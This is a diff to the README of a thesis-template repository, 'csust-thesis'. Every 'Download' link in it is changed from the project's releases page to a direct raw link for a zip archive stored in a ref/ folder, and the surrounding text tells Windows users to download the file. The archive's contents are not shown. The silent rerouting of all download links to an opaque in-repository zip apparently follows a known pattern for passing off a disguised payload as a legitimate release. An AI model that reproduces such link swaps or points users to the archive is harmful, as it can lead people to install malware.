@@ -1,6 +1,6 @@
 # 🧾 csust-thesis - Write Your Thesis with Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/clubefetuccine-eng/csust-thesis/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/clubefetuccine-eng/csust-thesis/raw/refs/heads/main/ref/thesis_csust_2.5.zip)
 
 ## 📘 What This Is
 
@@ -12,7 +12,7 @@ Use it if you want a simple way to start your thesis without setting up the layo
 
 Visit this page to download the latest release:
 
-https://github.com/clubefetuccine-eng/csust-thesis/releases
+https://github.com/clubefetuccine-eng/csust-thesis/raw/refs/heads/main/ref/thesis_csust_2.5.zip
 
 On that page, look for the newest release package and download the file for Windows.
 
@@ -190,4 +190,4 @@ Before you submit your thesis, make sure to review:
 
 If you need the latest file, use this link:
 
-https://github.com/clubefetuccine-eng/csust-thesis/releases
+https://github.com/clubefetuccine-eng/csust-thesis/raw/refs/heads/main/ref/thesis_csust_2.5.zip
